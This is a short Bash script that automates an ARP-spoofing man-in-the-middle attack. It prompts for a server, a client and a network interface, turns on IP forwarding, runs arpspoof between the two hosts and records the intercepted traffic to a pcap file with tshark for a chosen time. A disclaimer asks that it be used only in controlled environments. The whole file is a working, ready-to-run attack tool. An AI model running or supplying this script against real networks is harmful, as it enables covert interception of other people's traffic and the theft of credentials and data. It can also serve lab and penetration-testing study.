#!/usr/bin/env bash

# --> Author: Hiou

# --> Disclaimer: I am not responsible for the misuse that may be given to this tool. PLEASE use it in controlled environments and not to cause damage.

# --> Colours
green="\e[0;32m\033[1m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"
magenta="\e[0;35m\033[1m"
ENDCOLOR="\033[0m\e[0m"

trap ctrl_c INT

function ctrl_c(){

    echo -e "\n${green}\U000f705${magenta} exit... ${ENDCOLOR}"
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
    tput cnorm

}

function startAttack(){

    tput cnorm
    echo -ne "\n${red}\U000f29c${ENDCOLOR}${blue} Server: ${ENDCOLOR}" && read Server
    echo -ne "\n${red}\U000f29c${ENDCOLOR}${blue} Client: ${ENDCOLOR}" && read Client
    echo -ne "\n${red}\U000f29c${ENDCOLOR}${blue} Your Interface: ${ENDCOLOR}" && read Interface
    echo -ne "\n${red}\U000f29c${ENDCOLOR}${blue} Name of pcap output [Example xxx.pcap]: ${ENDCOLOR}" && read name
    echo -ne "\n${red}\U000f29c${ENDCOLOR}${blue} How long do you want to run arp-spoof: ${ENDCOLOR}" && read time
    echo -e "\n${green}\U000e62d${ENDCOLOR}${blue} Performing Arp-spoof ... ${ENDCOLOR}"
    echo 1 > /proc/sys/net/ipv4/ip_forward

    timeout $time arpspoof -i $Interface -t $Server -r $Client 2>/dev/null | timeout $time tshark -i $Interface -w $name -F pcap 2>/dev/null

    echo -e "\n${green}\U000f011${ENDCOLOR}${blue} Auto-Arp Off... ${ENDCOLOR}"
    echo -e "\n${green}\U000f427${ENDCOLOR}${blue} Success ${ENDCOLOR}"
}

function END(){

    echo -e "\n${blue}\U000f705${ENDCOLOR}${green} Exit... ${ENDCOLOR}"

    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
    exit 0
}

# --> Main

if [[ "$(id -u)" == "0" ]]; then

    echo -e "\n${green}\U000e0c7${ENDCOLOR}${blue} Auto-Arp Spoofing On.. ${ENDCOLOR}"
    startAttack
    tput cnorm
    END

else

    echo -e "\n${red}\U000f071${ENDCOLOR}${blue} NO ROOT ${ENDCOLOR}"
    exit 1

fi
